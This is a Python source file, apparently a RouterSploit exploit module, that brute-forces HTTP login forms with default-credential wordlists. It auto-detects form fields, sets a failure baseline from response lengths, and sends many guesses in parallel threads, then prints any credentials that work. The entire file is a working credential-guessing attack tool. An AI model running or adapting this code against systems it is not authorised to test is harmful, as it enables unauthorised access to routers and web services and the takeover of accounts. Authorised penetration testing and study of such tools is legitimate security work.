import threading
import requests
from bs4 import BeautifulSoup

from routersploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    LockedIterator,
    print_success,
    print_table,
    sanitize_url,
    boolify,
    multi,
)


class Exploit(exploits.Exploit):
    """
    Module performs dictionary attack with default credentials against HTTP form service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'HTTP Form Default Creds',
        'author': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
        ]
    }

    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
    port = exploits.Option(80, 'Target port')
    threads = exploits.Option(8, 'Number of threads')
    defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')
    form = exploits.Option('auto', 'Post Data: auto or in form login={{LOGIN}}&password={{PASS}}&submit')
    path = exploits.Option('/login.php', 'URL Path')
    verbosity = exploits.Option('yes', 'Display authentication attempts')

    credentials = []
    data = ""
    invalid = {"min": 0, "max": 0}

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))

        try:
            requests.get(url, verify=False)
        except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema):
            print_error("Invalid URL format: %s" % url)
            return
        except requests.exceptions.ConnectionError:
            print_error("Connection error: %s" % url)
            return

        # authentication type
        if self.form == 'auto':
            self.data = self.detect_form()

            if self.data is None:
                print_error("Could not detect form")
                return
        else:
            self.data = self.form

        print_status("Using following data: ", self.data)

        # invalid authentication
        self.invalid_auth()

        # running threads
        if self.defaults.startswith('file://'):
            defaults = open(self.defaults[7:], 'r')
        else:
            defaults = [self.defaults]

        collection = LockedIterator(defaults)
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def invalid_auth(self):
        for i in range(0, 21, 5):
            url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
            headers = {u'Content-Type': u'application/x-www-form-urlencoded'}

            user = "A" * i
            password = "A" * i

            postdata = self.data.replace("{{USER}}", user).replace("{{PASS}}", password)
            r = requests.post(url, headers=headers, data=postdata, verify=False)
            l = len(r.text)

            if i == 0:
                self.invalid = {"min": l, "max": l}

            if l < self.invalid["min"]:
                self.invalid["min"] = l
            elif l > self.invalid["max"]:
                self.invalid["max"] = l

    def detect_form(self):
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
        r = requests.get(url, verify=False)
        soup = BeautifulSoup(r.text, "lxml")

        form = soup.find("form")

        if form is None:
            return None

        if len(form) > 0:
            res = []
            for inp in form.findAll("input"):
                if 'name' in inp.attrs.keys():
                    if inp.attrs['name'].lower() in ["username", "user", "login"]:
                        res.append(inp.attrs['name'] + "=" + "{{USER}}")
                    elif inp.attrs['name'].lower() in ["password", "pass"]:
                        res.append(inp.attrs['name'] + "=" + "{{PASS}}")
                    else:
                        if 'value' in inp.attrs.keys():
                            res.append(inp.attrs['name'] + "=" + inp.attrs['value'])
                        else:
                            res.append(inp.attrs['name'] + "=")
        return '&'.join(res)

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbosity)
        name = threading.current_thread().name
        url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
        headers = {u'Content-Type': u'application/x-www-form-urlencoded'}

        print_status(name, 'process is starting...', verbose=module_verbosity)

        while running.is_set():
            try:
                line = data.next().split(":")
                user = line[0].strip()
                password = line[1].strip()

                postdata = self.data.replace("{{USER}}", user).replace("{{PASS}}", password)
                r = requests.post(url, headers=headers, data=postdata, verify=False)
                l = len(r.text)

                if l < self.invalid["min"] or l > self.invalid["max"]:
                    running.clear()
                    print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                    self.credentials.append((self.target, self.port, user, password))
                else:
                    print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
            except StopIteration:
                break

        print_status(name, 'process is terminated.', verbose=module_verbosity)
